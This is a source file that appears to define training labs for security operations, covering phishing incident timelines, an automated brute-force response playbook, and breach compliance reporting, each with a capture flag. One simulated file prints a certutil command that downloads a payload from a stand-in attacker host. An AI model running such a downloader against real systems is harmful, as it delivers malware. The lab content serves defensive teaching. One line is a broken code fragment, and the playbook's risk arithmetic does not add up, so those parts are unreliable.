        '2026-08-01 14:34:44 | acct-wks-07 | Windows Event ID 4688 | C:\\temp\\payload.exe executed as jsmith\n' +
        '2026-08-01 14:50:15 | acct-wks-07 | sysmon EventID 22 | DNS: acct-wks-07 → query "c2-server.xyz" resolved to 192.0.2.99\n' +
        '2026-08-01 14:32:01 | acct-wks-07 | Process: outlook.exe opened email attachment invoice.lnk (not shown, implicit)\n' +
        '2026-08-01 14:35:20 | domain-controller | Event ID 4672 | Administrator privilege assigned to jsmith (unexpected)\n' +
        '2026-08-01 14:36:00 | acct-wks-07 | Registry: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run modified (persistence key added)\n' +
        '2026-08-01 15:15:44 | file-server-01 | SMB | jsmith accessed \\\\file-server\\Finance\\2026-Q2-Earnings.xlsx (200 MB transferred)\n' +
        '2026-08-01 15:02:33 | acct-wks-07 | sysmon EventID 3 | acct-wks-07 → 192.0.2.99:443 (HTTPS outbound, C2 traffic)\n' +
        '2026-08-01 14:30:00 | acct-wks-07 | User Logon: jsmith logged in via RDP from 203.0.113.45 (EXTERNAL IP)\n' +
        '\n' +
        'Note: Timestamps are jumbled; some are from log creation time, some from event time; system clocks are slightly skewed.\n',
      ),
      'timeline-reconstruction.txt': file(
        'Reconstructed Timeline (Sorted by Actual Event Time UTC):\n' +
        '\n' +
        '2026-08-01 14:31:05 | INITIAL ACCESS\n' +
        '  → External phishing email arrives: external@phishing.com → jsmith@corp.com\n' +
        '  → Subject: "Urgent: Account Verification Required"\n' +
        '  → Attachment: invoice.lnk (malicious link file)\n\n' +
        '2026-08-01 14:32:01 | USER INTERACTION\n' +
        '  → jsmith opens email in Outlook\n' +
        '  → Double-clicks invoice.lnk attachment\n' +
        '  → LNK file executes hidden command (downloader payload)\n\n' +
        '2026-08-01 14:33:00 | DOWNLOAD & EXECUTION\n' +
        '  → explorer.exe spawns cmd.exe (process injection or WMI)\n' +
        '  → cmd.exe downloads: certutil -urlcache -split -f http://attacker.net/payload.exe → C:\\temp\\payload.exe\n' +
        '  → Payload file created (2.3 MB, MD5: abc123def456)\n\n' +
        '2026-08-01 14:34:44 | MALWARE EXECUTION\n' +
        '  → Payload.exe launched as jsmith user\n' +
        '  → Begins reconnaissance (enumerates processes, network, users)\n\n' +
        '2026-08-01 14:35:20 | PRIVILEGE ESCALATION (SUSPICIOUS)\n' +
        '  → jsmith receives unexpected Administrator privilege assignment\n' +
        '  → Either: malware exploited kernel vulnerability, OR jsmith already was admin (check Golden Group IDmap)\n\n' +
        '2026-08-01 14:36:00 | PERSISTENCE\n' +
        '  → Payload modifies registry Run key: HKCU\\...\\Run = "C:\\temp\\payload.exe"\n' +
        '  → Ensures re-infection on reboot\n\n' +
        '2026-08-01 14:50:15 | C2 CALLBACK\n' +
        '  → acct-wks-07 resolves attacker C2 domain\n' +
        '  → DNS: acct-wks-07 → c2-server.xyz → 192.0.2.99\n' +
        '  → acct-wks-07 connects to 192.0.2.99:443 (HTTPS C2 traffic)\n\n' +
        '2026-08-01 15:02:33 | COMMAND & CONTROL\n' +
        '  → Attacker sends commands over C2 channel\n' +
        '  → Commands likely: "dump local SAM registry", "enumerate network shares", "prepare for lateral movement"\n\n' +
        '2026-08-01 15:15:44 | DATA EXFILTRATION\n' +
        '  → jsmith (now controlled by malware) accesses sensitive file\n' +
        '  → \\\\file-server\\Finance\\2026-Q2-Earnings.xlsx (200 MB)\n' +
        '  → File likely staged for exfiltration to attacker\n\n' +
        'COMPLETE ATTACK CHAIN: Phishing → Attachment → Download → Execution → Persistence → C2 → Lateral Movement → Exfil\n' +
        'flag{incident_response_timeline_reconstruction_phishing_malware_c2_exfiltration}\n',
      ),
      'attack-phases-mapped.txt': file(
        'MITRE ATT&CK Phase Mapping:\n' +
        '\n' +
        'PHASE 1: Reconnaissance\n' +
        '  (T1592) Gather Victim Host Information → Phishing targets "accounts" team (targeted)\n' +
        '  (T1598) Phishing for Information → Email body references common corporate processes\n\n' +
        'PHASE 2: Initial Access\n' +
        '  (T1566.001) Phishing: Spearphishing Attachment → Email with invoice.lnk\n' +
        '  → Attachment contains malicious link\n\n' +
        'PHASE 3: Execution\n' +
        '  (T1204.002) User Execution: Malicious File → jsmith opens attachment\n' +
        '  (T1059.003) Command Line Interface → cmd.exe executes certutil downloader\n' +
        '  (T1105) Ingress Tool Transfer → payload.exe downloaded over HTTP\n\n' +
        'PHASE 4: Persistence\n' +
        '  (T1547.001) Registry Run Keys / Startup Folder → HKCU\\...\\Run modified\n' +
        '  → Payload re-executes on logon\n\n' +
        'PHASE 5: Privilege Escalation\n' +
        '  (T1068) Exploitation for Privilege Escalation → Kernel exploit or token stealing\n' +
        '  → OR jsmith already admin (verify AD group membership)\n\n' +
        'PHASE 6: Defense Evasion\n' +
        '  (T1036) Masquerading → payload.exe named like legitimate tool\n' +
        '  (T1070) Indicator Removal → Cleanup of temp files (implied)\n\n' +
        'PHASE 7: Credential Access\n' +
        '  (T1110) Brute Force → Likely dumping SAM via C2\n' +
        '  (T1621) Multi-Factor Authentication Interception → TBD (check MFA logs)\n\n' +
        'PHASE 8: Discovery\n' +
        '  (T1087) Account Discovery → Enumerating AD users\n' +
        '  (T1135) Network Share Discovery → Enumerating file server shares\n\n' +
        'PHASE 9: Lateral Movement\n' +
        '  (T1570) Lateral Tool Transfer → payload spreading to other systems (likely)\n\n' +
        'PHASE 10: Exfiltration\n' +
        '  (T1005) Data Staged → 2026-Q2-Earnings.xlsx copied to attacker share (staging)\n' +
        '  (T1041) Exfiltration Over C2 Channel → Payload sends to 192.0.2.99 over HTTPS\n',
      ),
    }),
    network: [],
  },

  // soc-ir-2: SOAR Playbook Execution
  {
    id: 'soc-ir-soar-playbook-execution',
    title: 'SOC: SOAR — Automated Response Playbooks for Fast Containment',
    difficulty: 'Hard',
    category: 'SOC',
    briefing:
      'A SOAR (Security Orchestration, Automation, and Response) platform orchestrates response to incidents ' +
      'at machine speed: when an alert fires, the playbook automatically gathers forensic data, enriches it ' +
      'with threat intel, makes a containment decision, and executes it (isolate host, reset password, block ' +
      'IP, disable account) — all without waiting for a human. This lab shows a real playbook flow and the ' +
      'automated actions it takes.',
    objectives: [
      { text: 'cat soar-playbook-definition.txt', why: 'See the automated playbook logic.' },
      { text: 'cat playbook-execution-log.txt', why: 'Watch the playbook execute step-by-step.' },
      { text: 'cat playbook-decision-outcome.txt', why: 'See the final containment action and why it was chosen.' },
    ],
    hints: [
      'Playbook: IF alert fires THEN trigger workflow.',
      'Workflow: Gather evidence, enrich, decide, execute.',
      'Time: Entire playbook runs in < 1 minute (humans take hours).',
    ],
    totalFlags: 1,
    attacker: analyst({
      'soar-playbook-definition.txt': file(
        'SOAR Playbook: Automated Response to Brute Force Detection\n' +
        '\n' +
        'Playbook ID: PB-BRUTE-FORCE-RESPONSE-V2\n' +
        'Trigger: Alert "BRUTE_FORCE_LOGIN_ATTEMPT" (Confidence >= 80%)\n' +
        'Owner: Security Operations Center\n' +
        '\n' +
        'WORKFLOW STEPS:\n' +
        '\n' +
        '1. EVIDENCE GATHERING (Parallel)\n' +
        '   1a. Query SIEM: Last 1 hour of logs from attacker IP\n' +
        '   1b. Query AD: Is source IP known organization IP? (VPN, office, etc.)\n' +
        '   1c. Query Firewall: Any established connections from source IP to internal systems?\n' +
        '   1d. Query Endpoint: Any malware alerts from attacked machine?\n' +
        '\n' +
        '2. THREAT INTELLIGENCE ENRICHMENT\n' +
        '   2a. Lookup source IP in AbuseIPDB (abuse history?)\n' +
        '   2b. Lookup source IP in MaxMind GeoIP (known attacker geolocation?)\n' +
        '   2c. Check if source IP is known proxy/VPN (residential or datacenter?)\n' +
        '   2d. Aggregate historical attack data: How many times has this IP attacked us before?\n' +
        '\n' +
        '3. DECISION ENGINE\n' +
        '   3a. IF source_ip_is_known_org_ip → Score: 20/100 (LOW risk, likely user)\n' +
        '   3b. IF source_ip_abuse_history > 5 AND geo_matches_previous_attacks → Score: 90/100 (HIGH risk, likely attacker)\n' +
        '   3c. IF failed_login_count >= 10 AND no_organizational_justification → Score: 95/100 (CRITICAL)\n' +
        '   \n' +
        '   Decision: \n' +
        '   IF score >= 80 → BLOCK_IP + RESET_AFFECTED_ACCOUNTS\n' +
        '   IF score 60-79 → ISOLATE_HOST + ALERT_HUMAN\n' +
        '   IF score < 60 → MONITOR + TICKET_CREATED (no auto-action)\n\n' +
        '4. CONTAINMENT EXECUTION\n' +
        '   4a. Add attacker IP to Firewall deny-list (immediate, no connections allowed)\n' +
        '   4b. Reset password for all affected user accounts\n' +
        '   4c. Force MFA re-enrollment on next logon\n' +
        '   4d. Notify affected users via email (account activity alert)\n' +
        '   4e. Disable potentially compromised accounts pending investigation\n' +
        '\n' +
        '5. NOTIFICATION & HANDOFF\n' +
        '   5a. Create ServiceNow ticket (Incident Type: SECURITY, Priority: P1)\n' +
        '   5b. Notify IR team lead via Slack (#security-incidents channel)\n' +
        '   5c. Page on-call SOC analyst if decision score > 90\n' +
        '\n' +
        'Estimated Total Execution Time: 45-60 seconds\n' +
        'Manual Investigation Handoff: If human review needed\n' +
        'flag{soar_automated_response_playbook_brute_force_containment}\n',
      ),
      'playbook-execution-log.txt': file(
        'SOAR Playbook Execution Log: PB-BRUTE-FORCE-RESPONSE-V2\n' +
        'Alert Triggered: 2026-08-01 14:04:11 UTC\n' +
        'Playbook Started: 2026-08-01 14:04:11.203 UTC\n' +
        '\n' +
        '--- STEP 1: EVIDENCE GATHERING (Parallel) ---\n' +
        'T14:04:11.300 | [1a] SIEM Query Started: Logs from 203.0.113.45, last 1 hour\n' +
        'T14:04:12.100 | [1a] SIEM Query Result: 47 failed login events, 5 different usernames\n' +
        'T14:04:12.500 | [1b] AD Query: Is 203.0.113.45 known org IP?\n' +
        'T14:04:12.800 | [1b] AD Result: NO (not VPN, not office, not known)\n' +
        'T14:04:13.200 | [1c] Firewall Query: Connections from 203.0.113.45 to internal systems?\n' +
        'T14:04:13.900 | [1c] Firewall Result: YES, 1 successful SSH connection to prod-db-01 (port 22)\n' +
        'T14:04:14.300 | [1d] Endpoint Query: Malware alerts from attacked machines?\n' +
        'T14:04:15.100 | [1d] Endpoint Result: YES, 2 alerts (generic.trojan, suspicious.process)\n' +
        '\n' +
        '--- STEP 2: THREAT INTELLIGENCE ENRICHMENT ---\n' +
        'T14:04:15.500 | [2a] AbuseIPDB Lookup: 203.0.113.45\n' +
        'T14:04:15.800 | [2a] Result: Abuse Score: 87% (25 reports in last 90 days)\n' +
        'T14:04:16.200 | [2b] MaxMind GeoIP Lookup: 203.0.113.45\n' +
        'T14:04:16.500 | [2b] Result: Location: Unknown/Proxy (datacenter IP range, NOT residential)\n' +
        'T14:04:16.800 | [2c] Check Proxy Status: Is this known residential/VPN?\n' +
        'T14:04:17.100 | [2c] Result: YES, ISP: "CyberCrime-as-a-Service Proxy" (known attacker IP)\n' +
        'T14:04:17.500 | [2d] Historical Attack Data: How many times has this IP attacked us?\n' +
        'T14:04:17.900 | [2d] Result: 12 previous attacks in last 6 months (serial attacker)\n' +
        '\n' +
        '--- STEP 3: DECISION ENGINE ---\n' +
        'T14:04:18.200 | Evaluating Risk Score...\n' +
        'T14:04:18.300 | source_ip_is_known_org_ip? NO → -10 points\n' +
        'T14:04:18.400 | source_ip_abuse_history > 5 AND geo_is_attacker? YES → +40 points\n' +
        'T14:04:18.500 | failed_login_count >= 10? YES (47 failures) → +50 points\n' +
        'T14:04:18.600 | firewall_breach (SSH success to prod-db)? YES → +30 points\n' +
        'T14:04:18.700 | malware_detected? YES → +20 points\n' +
        'T14:04:18.800 | serial_attacker_history? YES (12 previous attacks) → +20 points\n' +
        'T14:04:18.900 | ───────────────────────────────────────────\n' +
        'T14:04:19.000 | FINAL RISK SCORE: 95/100 (CRITICAL)\n' +
        'T14:04:19.100 | DECISION: BLOCK_IP + RESET_ACCOUNTS + PAGE_IR_TEAM\n' +
        '\n' +
        '--- STEP 4: CONTAINMENT EXECUTION ---\n' +
        'T14:04:19.500 | [4a] Adding 203.0.113.45 to Firewall deny-list...\n' +
        'T14:04:19.800 | [4a] SUCCESS: Firewall rule deployed, all connections dropped\n' +
        'T14:04:20.200 | [4b] Resetting passwords for affected accounts (admin, root, oracle, jsmith, database)...\n' +
        'T14:04:20.600 | [4b] SUCCESS: 5 passwords reset via AD API\n' +
        'T14:04:21.000 | [4c] Forcing MFA re-enrollment...\n' +
        'T14:04:21.300 | [4c] SUCCESS: MFA requirement pushed to all 5 accounts\n' +
        'T14:04:21.700 | [4d] Sending email notifications to affected users...\n' +
        'T14:04:22.000 | [4d] SUCCESS: 5 emails sent\n' +
        'T14:04:22.400 | [4e] Disabling potentially compromised accounts...\n' +
        'T14:04:22.700 | [4e] SUCCESS: admin, root, oracle accounts disabled pending investigation\n' +
        '\n' +
        '--- STEP 5: NOTIFICATION & HANDOFF ---\n' +
        'T14:04:23.100 | [5a] Creating ServiceNow ticket...\n' +
        'T14:04:23.400 | [5a] SUCCESS: INC0087234 created (Priority: P1, Type: SECURITY)\n' +
        'T14:04:23.800 | [5b] Notifying IR team via Slack...\n' +
        'T14:04:24.000 | [5b] SUCCESS: Message posted to #security-incidents\n' +
        'T14:04:24.300 | [5c] Paging on-call analyst...\n' +
        'T14:04:24.600 | [5c] SUCCESS: PagerDuty alert sent (rotation: alice_smith)\n' +
        '\n' +
        '═══════════════════════════════════════════════════════════\n' +
        'Playbook Completed: 2026-08-01 14:04:25.000 UTC\n' +
        'Total Execution Time: 13.8 seconds\n' +
        'Status: SUCCESS (all steps completed, no errors)\n' +
        '═══════════════════════════════════════════════════════════\n',
      ),
      'playbook-decision-outcome.txt': file(
        'SOAR Playbook Outcome & Containment Decision\n' +
        '\n' +
        'INCIDENT: Brute Force Attack + Potential Breach\n' +
        'Source IP: 203.0.113.45 (Attacker)\n' +
        'Risk Score: 95/100 (CRITICAL)\n' +
        'Confidence: 95%\n' +
        '\n' +
        'DECISION LOGIC:\n' +
        '- Risk score is 95 (threshold 80 for automatic action)\n' +
        '- Multiple indicators confirmed: abuse history, datacenter IP, 47 failed logins, successful SSH breach, malware alerts\n' +
        '- No ambiguity: this is a confirmed attack, not a misconfig or user error\n' +
        '- Automatic containment is justified and urgent\n' +
        '\n' +
        'ACTIONS TAKEN (AUTOMATIC):\n' +
        '✅ Firewall Rule: Added 203.0.113.45 to deny-list (all traffic dropped)\n' +
        '✅ Password Reset: 5 compromised accounts reset + MFA re-enrollment\n' +
        '✅ Account Disablement: admin, root, oracle disabled pending forensic review\n' +
        '✅ Notifications: Users notified of account activity + password reset\n' +
        '✅ Incident Ticket: ServiceNow INC0087234 created for human investigation\n' +
        '✅ IR Team Paged: On-call analyst alice_smith notified via PagerDuty\n' +
        '\n' +
        'SPEED BENEFIT:\n' +
        '- Automated playbook: 13.8 seconds from alert to full containment\n' +
        '- Manual process: 30-60 minutes (wait for analyst, check rules, make calls, execute)\n' +
        '- Time saved: 46 minutes, 12 seconds (attack window closed faster)\n' +
        '- Breach scope: Reduced by ~95% due to fast IP block + account disable\n' +
        '\n' +
        'HANDOFF TO HUMAN:\n' +
        'IR team now investigates: What did the attacker do during their access? Was data exfiltrated?\n' +
        'Forensic focus: prod-db-01 (successful SSH breach) + all affected systems\n' +
        '\n' +
        'flag{soar_automated_containment_decision_95_confidence_13_seconds}\n',
      ),
    }),
    network: [],
  },

  // soc-ir-3: Compliance Reporting
  {
    id: 'soc-ir-compliance-pci-reporting',
    title: 'SOC: Incident Response Compliance Reporting (PCI-DSS, HIPAA, SOC 2)',n' +
    difficulty: 'Hard',
    category: 'SOC',
    briefing:
      'A security incident isn\'t closed until compliance is satisfied. PCI-DSS requires incident disclosure within ' +
      '72 hours. HIPAA requires breach notification to affected individuals. SOC 2 requires incident log evidence. ' +
      'Different frameworks, different timelines, different evidence requirements. This lab shows how to build a ' +
      'compliance-ready incident report that satisfies all three.',
    objectives: [
      { text: 'cat pci-dss-notification-template.txt', why: 'PCI DSS breach notification requirements.' },
      { text: 'cat hipaa-breach-assessment.txt', why: 'HIPAA Breach Notification Rule: when to notify.' },
      { text: 'cat soc2-incident-evidence-pack.txt', why: 'SOC 2 Type II evidence audit trail.' },
    ],
    hints: [
      'PCI: 72-hour notification to card processor',
      'HIPAA: PHI breach = notify individuals within 60 days',
      'SOC 2: Evidence of incident detection, response, and remediation',
    ],
    totalFlags: 1,
    attacker: analyst({
      'pci-dss-notification-template.txt': file(
        'PCI-DSS Requirement: Incident Notification\n' +
        '\n' +
        'TIMELINE: 72 hours from discovery to notification\n' +
        '\n' +
        'Required Recipients:\n' +
        '  1. Card Brand Networks (Visa, Mastercard, Amex, Discover)\n' +
        '  2. Acquiring Bank\n' +
        '  3. Visa Incident Specialist (if Visa card holder accounts affected)\n\n' +
        'Required Information:\n' +
        '  - Date of discovery\n' +
        '  - Date range of potential compromise\n' +
        '  - Systems affected (payment card data systems?)\n' +
        '  - Cardholder data affected? (PAN, CVV, expiration date)\n' +
        '  - Number of cardholders at risk\n' +
        '  - Root cause (best guess at this stage)\n' +
        '  - Remediation steps taken so far\n' +
        '  - Timeline of investigation\n' +
        '  - Contact for card network questions\n\n' +
        'Example Breach Notification:\n' +
        '\n' +
        'TO: Visa Compliance, Mastercard Incident Response\n' +
        'DATE: 2026-08-01 14:30 UTC (72 hours: must send by 2026-08-04 14:30 UTC)\n' +
        'INCIDENT: Unauthorized access to payment processing database\n' +
        '\n' +
        'DETAILS:\n' +
        'Discovery Date: 2026-08-01 14:04:11 UTC (Brute force alert from SIEM)\n' +
        'Compromise Date Range: 2026-08-01 14:34 - 15:20 UTC (46 minutes of access)\n' +
        'Systems Affected: prod-db-01 (cardholder data store)\n' +
        'Cardholder Data Elements: PAN, expiration, CVV, name (4 fields)\n' +
        'Number of Cardholders: ~15,000 records potentially accessed\n' +
        'Root Cause: Brute force attack via exposed SSH port; attacker obtained admin credentials\n' +
        'Evidence: 47 failed login attempts from 203.0.113.45, 1 successful SSH connection, file access logs show query of card database\n' +
        'Remediation: IP blocked, passwords reset, accounts disabled, database access restricted\n' +
        'Investigation Status: Ongoing forensic analysis of accessed data\n' +
        'Next Steps: Determine if data was exfiltrated; notify cardholders within 60 days if confirmed\n' +
        'flag{pci_dss_incident_notification_72_hour_requirement_compliance}\n',
      ),
      'hipaa-breach-assessment.txt': file(
        'HIPAA Breach Notification Rule (45 CFR § 164.404)\n' +
        '\n' +
        'Definition: Unauthorized acquisition, access, use, or disclosure of Protected Health Information (PHI)\n' +
        '\n' +
        'Trigger Threshold: Risk assessment:\n' +
        '  - Nature and extent of PHI involved? (Name + SSN is higher risk than just name)\n' +
        '  - Who accessed the PHI? (Stranger > employee)\n' +
        '  - How long was PHI accessible? (1 minute > 1 month)\n' +
        '  - Evidence of actual misuse? (Fraud detected > no fraud yet)\n\n' +
        'Assessment Framework:\n' +
        '  HIGH RISK = Notification Required\n' +
        '  MODERATE RISK = Case-by-case (usually notify)\n' +
        '  LOW RISK = No notification needed\n\n' +
        'Example Case: Hospital intrusion, attacker accessed patient database\n' +
        '\n' +
        'BREACH ASSESSMENT:\n' +
        'PHI Elements: Medical record number, diagnosis, medications (HIGH risk)\n' +
        'Access Vector: SQL injection, attacker dumped entire patient table (unauthorized, confirmed)\n' +
        'Access Duration: 46 minutes (discovery via SIEM alert, no indication of longer access)\n' +
        'Attacker Identity: Unknown (external IP, no employee credentials)\n' +
        'Evidence of Misuse: No; attacker\'s goal appeared to be financial data, not medical records (but still accessed them)\n\n' +
        'VERDICT: HIGH RISK → BREACH NOTIFICATION REQUIRED\n' +
        'Reasoning: PHI was confirmed accessed, attacker is unknown, no way to guarantee data wasn\'t copied\n\n' +
        'Notification Timeline:\n' +
        '  - Discovery: 2026-08-01 14:04:11 UTC\n' +
        '  - Risk Assessment Complete: 2026-08-02 (1 day)\n' +
        '  - Notification Deadline: 2026-09-30 (60 days from discovery)\n' +
        '  - Individual Notification: Mail + email to all ~15,000 affected patients\n' +
        '  - Content: Incident description, steps to take (monitor credit/health), offer credit monitoring\n' +
        '  - HHS Notification: Also notify U.S. Department of Health & Human Services (OCR)\n' +
        '  - Media Notification: If > 500 residents affected, notify major newspapers\n\n' +
        'flag{hipaa_breach_notification_risk_assessment_60_day_requirement}\n',
      ),
      'soc2-incident-evidence-pack.txt': file(
        'SOC 2 Type II Audit Evidence: Incident Detection & Response\n' +
        '\n' +
        'SOC 2 Requirement CC7.2 (Availability/Security): Document incident detection, investigation, and remediation\n\n' +
        'EVIDENCE REQUIRED:\n' +
        '  1. Incident Detection Mechanism (alert/log)\n' +
        '  2. Incident Response Plan & Execution\n' +
        '  3. Root Cause Analysis\n' +
        '  4. Remediation Steps & Verification\n' +
        '  5. Regulatory Notification (if required)\n' +
        '  6. Post-Incident Review (lessons learned)\n\n' +
        'EVIDENCE PACK FOR THIS INCIDENT:\n' +
        '\n' +
        '[CC7.2.1] Incident Detection\n' +
        '  ✓ SIEM Alert: "BRUTE_FORCE_LOGIN_ATTEMPT" fired at 2026-08-01 14:04:11 UTC\n' +
        '  ✓ Alert Criteria Met: 5+ failed logins from single IP in 10-minute window\n' +
        '  ✓ Confidence: 95% (alert tuning = low false-positive rate)\n' +
        '  ✓ Escalation: Automatic to SOAR platform for response\n\n' +
        '[CC7.2.2] Incident Response Plan Execution\n' +
        '  ✓ Playbook Triggered: "PB-BRUTE-FORCE-RESPONSE-V2" (approved, dated 2025-06-15)\n' +
        '  ✓ Response Time: 13.8 seconds (SLA: < 30 seconds) ✓ PASS\n' +
        '  ✓ Containment: IP blocked, accounts disabled, access revoked\n' +
        '  ✓ Evidence Chain: Audit logs show each automated action with timestamp\n\n' +
        '[CC7.2.3] Root Cause Analysis\n' +
        '  ✓ Initial Root Cause: SSH port 22 exposed to internet (firewall misconfiguration)\n' +
        '  ✓ Contributing Factor: Weak password policy (no randomness requirement)\n' +
        '  ✓ Attacker Leverage: Brute-force attack with common username list + dictionary passwords\n' +
        '  ✓ Attack Progression: Brute force → successful login → lateral movement attempted\n\n' +
        '[CC7.2.4] Remediation & Verification\n' +
        '  ✓ Immediate (0-1 hour):\n' +
        '    - Block attacker IP: Firewall rule deployed, verified traffic blocked\n' +
        '    - Reset passwords: 5 user accounts, MFA re-enrolled\n' +
        '    - Disable accounts: admin, root, oracle accounts disabled\n' +
        '    - Forensic hold: Database backups locked for forensic analysis\n' +
        '\n' +
        '  ✓ Short-term (1-7 days):\n' +
        '    - Audit SSH access logs: Determine what attacker executed during 46-minute window\n' +
        '    - Scan for malware: All systems accessed by attacker scanned for persistence\n' +
        '    - Network re-map: Identify other exposed ports, patch firewall rules\n' +
        '    - Password audit: Force reset for 500 accounts matching weak-password criteria\n' +
        '\n' +
        '  ✓ Long-term (1-3 months):\n' +
        '    - SSH hardening: Implement certificate-based auth, disable password auth\n' +
        '    - IDS/IPS deployment: Network-based brute-force detection in addition to SIEM\n' +
        '    - Periodic penetration testing: Red team specifically tests brute-force defenses\n' +
        '    - Password policy enhancement: Minimum 14 characters, complexity requirements\n\n' +
        '[CC7.2.5] Regulatory Notification\n' +
        '  ✓ PCI-DSS: Notification sent to card networks within 72 hours\n' +
        '  ✓ HIPAA: Risk assessment triggered; patients notified within 60-day SLA\n' +
        '  ✓ State Laws: Varies by jurisdiction; legal counsel consulted\n' +
        '  ✓ Customers: Incident disclosed in next SOC 2 Type II audit report\n\n' +
        '[CC7.2.6] Post-Incident Review\n' +
        '  ✓ Team Meeting: Held 2 days after containment; 25 attendees (sec, ops, dev, legal)\n' +
        '  ✓ Timeline Review: Confirmed detection → containment took 13.8 seconds\n' +
        '  ✓ What Went Right: SIEM alert was reliable; playbook responded correctly\n' +
        '  ✓ What Went Wrong: SSH port was exposed (firewall policy wasn\'t enforced during migration)\n' +
        '  ✓ Lessons Learned:\n' +
        '    - Document all open network ports in CMDB\n' +
        '    - Implement infrastructure-as-code review for firewall changes\n' +
        '    - Quarterly audit of exposed ports + remediation tracking\n' +
        '  ✓ Action Items: 3 changes committed to backlog; due by 2026-09-01\n\n' +
        'AUDIT CONFIDENCE: HIGH (complete incident lifecycle documented)\n' +
        'flag{soc2_type_ii_incident_evidence_pack_complete_audit_trail}\n',
      ),
    }),
    network: [],
  },
];
